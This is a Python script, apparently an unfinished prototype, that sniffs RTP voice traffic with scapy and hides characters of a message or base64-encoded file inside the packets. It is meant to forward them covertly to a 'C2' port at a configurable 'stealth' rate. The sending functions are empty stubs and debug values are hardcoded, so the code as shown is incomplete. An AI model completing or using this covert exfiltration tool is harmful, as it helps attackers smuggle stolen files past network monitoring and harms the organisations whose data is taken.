import argparse
import base64
import queue
import time
import scapy.all as scapy
from scapy.layers.inet import UDP
from scapy.packet import Raw
from scapy.packet import ls
from scapy.all import bytes_hex


def encodePacket(packet, character):
    return packet[:66] + bytes(character, encoding="raw_unicode_escape") + packet[67:]


def sendPacket(packet):
    pass


def sendEncodedPacket(packet, payload):
    pass


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("-m", "--message", help="String message to send")
    parser.add_argument("-f", "--filename", help="File to send")
    parser.add_argument("-s", "--stealth", help="Number of packet encodings between each RTP transmission")
    parser.add_argument("-d", "--destination_address", help="The destination ipv4 address we send encoded RTP traffic")
    parser.add_argument("-c", "--C2_listening_port", help="The port we forward encoded RTP traffic ro")
    parser.add_argument("-l", "--server_listening_port", help="The port we receive RTP traffic from on the VoIP server")
    args = parser.parse_args()

    stealthVal = args.stealth
    stealthVal = 1

    if args.filename is not None:
        file = open(args.filename, 'rb')
        transmissionString = base64.b64encode(file.read())
        file.close()
    else:
        transmissionString = args.message

    packetQ = queue.Queue()

    asyncSniffer = scapy.AsyncSniffer(filter=f"dst port {10374}", prn=lambda x: packetQ.put(x))
    asyncSniffer.start()

    encodedPackets = 0
    sentPackets = 0

    transmissionString = "a"
    while encodedPackets < len(transmissionString):
        if packetQ.qsize() > 0:
            pkt = packetQ.get()
            if sentPackets % stealthVal == 0:
                encodedPackets += 1
                print(pkt.payload.payload.payload.original)
                # print(bytes(pkt))
                encodedPacket = encodePacket(pkt.payload.payload.payload.original, transmissionString[sentPackets])
                print(encodedPacket)

            sentPackets += 1
    asyncSniffer.stop()

